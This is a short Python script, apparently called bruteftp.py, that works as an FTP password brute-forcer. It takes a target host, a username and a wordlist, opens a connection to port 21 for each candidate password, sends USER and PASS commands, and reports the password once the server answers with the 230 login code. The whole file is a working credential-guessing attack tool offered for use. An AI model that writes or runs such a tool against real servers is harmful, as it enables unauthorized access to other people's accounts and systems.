#!/usr/bin/python
import socket, sys, re
print("=== WELCOME TO FTP BRUTE FORCE! ===")
try:

	target = sys.argv[1]
	user = sys.argv[2]
	wordlist = sys.argv[3]
	wl = open(wordlist, 'r')
	for w in wl.readlines():
		w = w.strip("\n")
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,21))
		s.recv(1024)
		s.send(str("USER "+user+"\r\n").encode())
		s.recv(1024)
		s.send(str("PASS "+w+"\r\n").encode())
		resp = s.recv(1024)
		s.send(str("QUIT\r\n").encode())
		if re.search('230', str(resp)):
			print("[+] CONNECTED --> ", w)
			break
		else:
			print("[-] Testing --> ", w)
except:
	print('ERROR!')
	print('Usage: ./bruteftp.py 127.0.0.1 user wordlist.txt')
